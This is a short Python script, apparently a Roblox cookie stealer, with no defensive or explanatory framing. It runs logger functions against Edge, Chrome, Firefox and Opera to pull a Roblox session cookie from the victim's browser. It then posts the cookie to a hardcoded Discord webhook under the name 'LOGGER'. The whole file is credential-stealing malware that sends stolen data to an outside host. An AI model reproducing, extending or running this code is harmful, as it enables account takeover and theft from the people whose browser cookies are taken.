from loggers import *
from ThreadWithReturnValue import *

WEBHOOK = 'https://discord.com/api/webhooks/988805891161747517/NasYsAMhHj-t-coFhiLrj7RTodovn6UOzGUGRGw9HKAKQjlIgx-Gpiqlw0JaqopBxZlk'


def roblox_logger(event=None):
    finded_cookie = ""

    browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]

    for x in browsers:
        twrv = ThreadWithReturnValue(target=x)
        twrv.start()
        if (twrv.join() is None):
            continue
        else:
            finded_cookie = twrv.join()
            break

    requests.post(WEBHOOK, json={'username': 'LOGGER',
                  'content': f'```Cookie: {finded_cookie}```'})
